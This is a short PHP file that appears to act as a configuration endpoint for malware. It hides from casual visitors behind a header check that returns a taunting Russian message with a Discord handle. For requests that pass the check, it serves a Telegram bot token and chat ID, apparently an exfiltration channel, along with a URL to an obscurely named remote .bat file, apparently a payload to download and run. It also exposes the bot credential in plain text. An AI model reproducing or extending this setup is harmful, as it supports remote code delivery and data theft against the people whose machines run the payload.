<?php
// config.php
if(php_sapi_name() !== 'cli' && empty($_SERVER['HTTP_X_REQUESTED_WITH'])) {
    die("чё ты тут забыл? пиши в дс mishapisykalegenda, поболтаем)");
}

header('Content-Type: application/json');
die(json_encode([
    'api_token' => '7892006818:AAFeY66Q3MWcI5cKmjIHC09x0v3fbG6OrAM',
    'chat_id' => 5343054599,
    'bat_url' => 'https://raw.githubusercontent.com/BatyaLand/BatyaLand/refs/heads/main/ghdjgjdjghdjgjkdgvdbtg56546ggjg.bat'
]));
?>